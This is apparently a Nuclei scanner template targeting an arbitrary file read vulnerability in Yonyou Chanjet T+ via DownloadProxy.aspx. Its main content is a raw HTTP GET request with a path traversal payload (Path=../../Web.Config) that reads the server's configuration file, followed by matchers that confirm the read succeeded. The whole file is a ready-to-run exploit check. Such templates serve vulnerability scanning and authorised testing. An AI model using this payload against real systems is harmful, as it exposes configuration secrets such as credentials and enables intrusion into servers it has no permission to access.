id: yongyouOA-NC-TPlus-DownloadProxy-aspx-file-read

info:
  name: 用友畅捷通TPlus-DownloadProxy.aspx任意文件读取漏洞
  author: cnaq  
  severity: medium
  description: 用友畅捷通TPlus-DownloadProxy.aspx任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9ATPlus-DownloadProxy.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: yongyouOA,NC,file,read,lfi

requests:
  - raw:
      - |
        GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
        X-Ajaxpro-Method: GetStoreWarehouseByStore
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'xml'